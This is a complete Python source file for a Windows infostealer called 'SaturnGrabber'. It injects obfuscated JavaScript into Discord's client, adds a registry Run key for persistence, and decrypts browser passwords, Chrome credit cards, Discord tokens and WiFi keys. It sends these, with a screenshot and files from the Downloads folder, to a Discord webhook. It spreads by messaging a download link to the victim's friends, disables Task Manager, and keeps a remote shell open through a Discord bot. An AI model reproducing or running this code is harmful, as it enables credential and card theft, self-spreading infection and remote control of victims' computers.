import os

if os.name != 'nt':
    exit()

import re
import json
import ctypes
import random
import base64
import sqlite3
import secrets
import websocket
import threading
from winreg import *
from time import sleep
from shutil import copyfile, copy
from subprocess import check_output

try:
    paths = [x for x in [
        os.getenv("LOCALAPPDATA") + '\\Discord\\app-1.0.1014\\modules\\discord_desktop_core-1\\discord_desktop_core\\',
        os.getenv("APPDATA")  + '\\DiscordCanary\app-1.0.1014\\modules\\discord_desktop_core-1\\discord_desktop_core\\',
        os.getenv("LOCALAPPDATA") + '\\DiscordPTB\app-1.0.1014\\modules\\discord_desktop_core-1\\discord_desktop_core\\'
    ] if os.path.exists(x)]

    for path in paths:
        ft = __file__.split(".")[1]
        JS = f"var _0x5ef013=require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73')['\x65\x78\x65\x63'];_0x5ef013('{path}discord_appdb.{ft}');\nmodule.exports = require('./core.asar');"
        with open(path + "index.js", "w") as file:
            file.write(JS)
        FILENAME = os.path.basename(__file__)
        copyfile(FILENAME, path + f"base/DiscordUpdater.{ft}")
        ctypes.windll.kernel32.SetFileAttributesW(path + f"DiscordUpdater.{ft}", 2)

    dirs = ["C:\\Windows\\", "C:\\Program Files\\", "C:\\Windows\\security\\database\\", "C:\\Windows\\servicing\\", "C:\\Program Files\\Windows Mail\\"]
    Path = random.choice(dirs)
    copyfile(__file__, Path)
    file, ext = os.path.splitext(__file__)
    key = OpenKey(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
    SetValueEx(key, 'Program', REG_SZ, Path + file + ext)
    CloseKey(key)
    ctypes.windll.kernel32.SetFileAttributesW(Path + file + ext, 2)
except:
    pass

os.system("python -m pip install pycrypto && python -m pip install mss && python -m pip install pypiwin32 && python -m pip install pywin32 && python -m pip install requests")

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from win32file import *
from requests import get, post
import mss

WEBHOOK = "webhook here"
BOT_TOKEN = ""
controlKey = str(hex(secrets.randbits(128))[2:])

class SaturnGrabber:
    
    def __init__(self):
        self.roaming = os.getenv("APPDATA") 
        self.appdata = os.getenv("LOCALAPPDATA")
        self.passwords = []
        self.creditcards = []
        self.tokens = []

        try:self.decrypt_passwords()
        except:pass
        try:self.get_tokens()
        except:pass
        try:self.get_credit_cards()
        except:pass  

        ccstring = ""

        for cc in self.creditcards: ccstring += "______________________________________\n\n{0}______________________________________\n\n".format("".join(f" {n}: {v}\n" for (n, v) in cc.items()))


        name = os.getlogin()
        ip = get("https://api.ipify.org").text
        hwid = str(check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        cpu = "Couldn't get CPU name"
        gpu = "Couldn't get GPU name"
        windows_key = "Couldn't find Windows Key"
        
        try:cpu = check_output(r"wmic path cpu get name", creationflags=0x08000000).decode().strip("Name\n").strip()
        except:pass

        try:gpu = check_output(r"wmic path win32_VideoController get name", creationflags=0x08000000).decode().strip("Name\n").strip()
        except:pass

        try:windows_key=check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except:pass

        username = ' '
        userid = ' '
        userbio = ' '
        email = ' '
        phone_number = ' '

        if self.tokens:
            try:
                user = get("https://discord.com/api/v10/users/@me", headers={'Authorization': self.tokens[0]}).json()
                username = f"{user['username']}#{user['discriminator']}"
                userid = user['id']
                userbio = user['bio']
                email = user['email']
                phone_number = user['phone']
            except:
                pass

        data = {
            "content": "@everyone",
            "embeds": [{
                "title": "",
                "description": "",
                'color': 0xff0000,
                "url": "https://discord.com",
                "author": {
                    "name": "",
                    "url": "https://discord.com",
                    "icon_url": ""
                },
                "thumbnail": {
                    "url": ""
                },
                "image": {
                    "url": ""
                },
                "footer": {
                    "text": "Made by coderunner1#0228",
                    "icon_url": ""
                },
                "fields": [
                    {
                        "name": " PC Info",
                        "value": f"""```ansi
 [2;40m [2;31mName:[0m[2;40m [2;36m{name}[0m[2;40m 
 [2;31mIP:[0m[2;40m [2;36m{ip}[0m[2;40m 
 [2;31mHWID:[0m[2;40m [2;36m{hwid}[0m[2;40m 
 [2;31m[2;31mCPU:[0m[2;31m[2;40m[0m[2;40m [2;34m[2;36m{cpu}[0m[2;34m[2;40m[0m[2;40m 
 [2;31mGPU:[0m[2;40m[2;31m[0m[2;40m [2;36m{gpu}
 [0m[2;40m[2;31m [2;31mWKEY:[0m[2;31m[2;40m[0m[2;40m [2;36m{windows_key}[0m[2;40m [0m[2;40m[0m
```""",
                        "inline": True
                    },
                    {
                        "name": " User Info",
                        "value": f"""```ansi
 [2;40m [2;31mName:[0m[2;40m [2;36m{username}[0m[2;40m 
 [2;31mUser ID:[0m[2;40m [2;36m{userid}[0m[2;40m 
 [2;31mBio:[0m[2;40m [2;36m{userbio}[0m[2;40m 
 [2;31m[2;31mEmail:[0m[2;31m[2;40m[0m[2;40m [2;34m[2;36m{email}[0m[2;34m[2;40m[0m[2;40m 
 [2;31mPhone Number:[0m[2;40m [2;36m{phone_number}[0m[2;40m [0m[2;40m[0m
```""",
                        "inline": True
                    },
                    {
                        "name": " Passwords",
                        
                        "value": """```ansi
 [2;40m[2;36m {} [0m[2;40m[0m[2;40m[0m
```
""".format("\n".join(self.passwords)),
                        "inline": False
                    },
                    {
                        "name": " Credit Cards",
                        "value": f"""```ansi
 [2;40m[2;36m {ccstring} [0m[2;40m[0m[2;40m[0m
```""",
                        "inline": False
                    },
                    {
                        "name": " Wifi Passwords",
                        "value": """```ansi
 [2;40m[2;36m {} [0m[2;40m[0m[2;40m[0m
```""".format("\n".join(self.get_wifi())),
                        "inline": False
                    },
                    {
                        "name": " Tokens",
                        "value": """```ansi
 [2;40m[2;37m{}  [0m[2;40m[0m[2;40m[0m
```""".format("\n".join(self.tokens)),
                        "inline": False
                    },
                    {
                        "name": " Control Key",
                        "value": f"""```ansi
 [2;40m[2;37m{controlKey}  [0m[2;40m[0m[2;40m[0m
```""",
                        "inline": True
                    },
                ]
            }]
        }

        post(WEBHOOK, json=data)

        with mss.mss() as sct:
            sct.shot(mon=-1, output="screenshot.png")
            ssfile = open("screenshot.png", "rb")
            post(WEBHOOK, files = {'upload_file': ssfile})
            ssfile.close()

        try:
            os.remove("cc.txt")
        except:
            pass
        try:
            os.remove("screenshot.png")
        except:
            pass

        post(WEBHOOK, json={
            "embeds": [{
                "title": "",
                "description": "",
                'color': 0xff0000,
                "footer": {
                    "text": "Made by coderunner1#0228",
                    "icon_url": ""
                },
                "fields": [
                    {
                        "name": "ㅤ",
                        "value": f"""```
Sending {name}'s Files```""",
                        "inline": False
                    }
                ]
            }]
        })
        
        download_folder = os.path.expanduser("~") + "\\Downloads\\"
        files = []
        for file in os.listdir(download_folder):
            if file.endswith((
                "txt", "jpeg", "png", "jpg", "py", "log", "ldb", "json", "docx", "doc", "torrent"
            )):
                files.append(download_folder + file)
        for file in files:
            try:
                filetosend = open(file, "rb")
                post(WEBHOOK, files = {"upload_file": filetosend})
                filetosend.close()
            except Exception as e:
                post(WEBHOOK, json={'content': e})
                print(e)

        if self.tokens[0]:
            self.spread(self.tokens[0])

    def get_encryption_key(self, path):
        local_state = path
        with open(local_state, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt(self, data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except: 
                return ""

    def decrypt_passwords(self):
        
        paths = {
            "Chrome": self.appdata + r"\Google\Chrome\User Data\\",
            "Edge": self.appdata + r"\Microsoft\Edge\User Data\\",
            "Yandex": self.appdata + r"\Yandex\YandexBrowser\User Data\\",
            "Brave": self.appdata + r"\BraveSoftware\Brave-Browser\User Data\\",
            "Opera": self.roaming + r"\Opera Software\Opera Stable",
            "Opera GX": self.roaming + r"\Opera Software\Opera GX Stable"
        }
        
        for browser, path in paths.items():
            key = self.get_encryption_key(path + "Local State")
            db_path = path + "Login Data"
            filename = "Data.db"
            copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                password = self.decrypt(data=row[2], key=key)
                if username or password: 
                    self.passwords.append(f"{url} -[{username}:{password}]")
                else:
                    continue
            cursor.close()
            db.close()
            try:os.remove(filename)
            except:pass

    def get_tokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if "discord" in name.lower():
                if not os.path.exists(path): 
                    continue
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") or file_name.endswith(".ldb"): continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for l in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            token = self.decrypt(base64.b64decode(l.split("dQw4w9WgXcQ:")[1]), self.get_encryption_key(f"{self.roaming}\\{name.lower()}\\Local State"))
                            self.tokens.append(token)
            else:                  
                if not os.path.exists(path): 
                    continue
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") or file_name.endswith(".ldb"): continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|[\w]{26}\.[\w]{6}.{39}', line):
                            self.tokens.append(token)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path,_, files in os.walk(
                self.roaming + "\\Mozilla\\Firefox\\Profiles"
                ):
                for file in files:
                    if not file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|[\w]{26}\.[\w]{6}.{39}', line):
                            self.tokens.append(token)

    def get_credit_cards(self):
        db = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Web Data"
        copy(db, ".\\")

        conn = sqlite3.connect(".\\Web Data")
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM credit_cards")

        for cc in cursor.fetchall():

            f = self.get_encryption_key(rf'{self.appdata}\Google\Chrome\User Data\Local State')

            name = cc[1]
            cnum = self.decrypt(cc[4], f)
            exp = f"{cc[2]},{cc[3]}"
            card_nick = cc[10]

            credit_card = {
                "Name": name,
                "Credit Card Number": cnum,
                "Expiration": exp,
                "Card Nickname": card_nick
            }
            self.creditcards.append(credit_card)

        cursor.close()
        conn.commit()
        try:
            os.remove("Web Data")  
        except:
            pass
        

    def spread(self, token):
        friends = get(
            "https://discord.com/api/v9/users/@me/relationships",
            headers={"Authorization": token},
        ).json()

        def getchat(token, id):
            return get(
                "https://discord.com/api/v9/users/@me/channels",
                headers={"Authorization": token},
                data={'recipient_id': id}
            ).json()['id']

        file_link = post("https://api.anonfiles.com/upload", files={"file": open(__file__, 'rb')}).json()
        

        for friend in friends:
            try:
                chat_id = getchat(token, friend['id'])
                post(
                    f"https://discord.com/api/v9/channels/{chat_id}/messages",
                    headers={"Authorization": token},
                    data={"content": file_link['data']['file']['url']['short']}
                )
            except:
                sleep(5)
                chat_id = getchat(token, friend['id'])
                post(
                    f"https://discord.com/api/v9/channels/{chat_id}/messages",
                    headers={"Authorization": token},
                    data={"content": file_link['data']['file']['url']['short']}
                )
            sleep(0.75)

    def get_wifi(self):
        out = []
        data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                out.append("{:<30}| {:<}".format(i, results[0]))
            except IndexError:
                out.append("{:<30}| {:<}".format(i, ""))
        return out

def taskMgrHide():
    paths = [r"\CurrentVersion\Policies", "SOFTWARE", r"\System", r"\Microsoft\Windows"]               
    reg_p: str = paths[1] + paths[3] + paths[0] + paths[2]
    reg_n: str = "DisableTaskMgr"
    reg_p2: str = paths[1] + paths[3] + r" NT\CurrentVersion\Winlogon'"
    reg_n2: str = "DisableCAD"
    val: int = 2-1
    try:
        reg_k = OpenKey(HKEY_LOCAL_MACHINE, reg_p, 0, KEY_SET_VALUE)
        SetValueEx(reg_k, reg_n, 0, REG_SZ, val)
        CloseKey(reg_k)
        reg_k = OpenKey(HKEY_LOCAL_MACHINE, reg_p2, 0, KEY_SET_VALUE)
        SetValueEx(reg_k, reg_n2, 0, REG_SZ, val)
        CloseKey(reg_k)
    except:
        pass


if __name__ == "__main__":
    call = SaturnGrabber()
    taskMgrHide()

    #---------------------------------------------#

    def recieve_json_response(ws, request):
        resp = ws.recv()
        if resp:
            return json.loads(resp)

    def heartbeat(interval, ws):
        while True:
            sleep(interval)
            heartbeatJson = {
                "op": 1,
                "d": "null"
            }
            ws.send(json.dumps(heartbeatJson))

    ws = websocket.WebSocket()
    ws.connect("wss://gateway.discord.gg/?v=6&encording=json")
    
    event = recieve_json_response(ws)
    heartbeat_interval = event['d']['heartbeat_interval']/1000
    threading._start_new_thread(heartbeat, (heartbeat_interval, ws))

    ws.send(json.dumps({
        "op": 2,
        "d": {
            "token": BOT_TOKEN,
            "properties": {
                "$os": "windows",
                "$browser": "chrome",
                "$device": "pc"
            }
        }
    }))


    while True:
        event = recieve_json_response(ws)
        try:
            content = event['d']['content'].split(" ")
            uid = event['d']['author']['id']
            
            if content[0] == f"!{controlKey}":
                output = check_output(content[1:], shell=True, text=True).strip()
                message = f"""```ansi
[2;40m[2;36m[2;40m[2;34m[2;40m[2;32m[2;40m[2;35m[2;40m[2;37m {output} [0m[2;35m[2;40m[0m[2;35m[2;40m[2;40m[2;37m[0m[2;35m[2;40m[0m[2;35m[2;40m[0m[2;32m[2;40m[0m[2;32m[2;40m[2;40m[2;33m[0m[2;32m[2;40m[0m[2;32m[2;40m[0m[2;34m[2;40m[0m[2;34m[2;40m[0m[2;36m[2;40m[0m[2;36m[2;40m[0m[2;40m[0m[2;40m[0m
```"""
                post(WEBHOOK, json={
                    "name": os.getlogin(),
                    "embeds": [{
                        "title": "",
                        "description": "",
                        'color': 0xff0000,
                        "footer": {
                            "text": "Made by coderunner1#0228",
                            "icon_url": ""
                        },
                        "fields": [
                            {
                                "name": "Output",
                                "value": message,
                                "inline": False
                            }
                        ]
                    }]
                })
        except:
            pass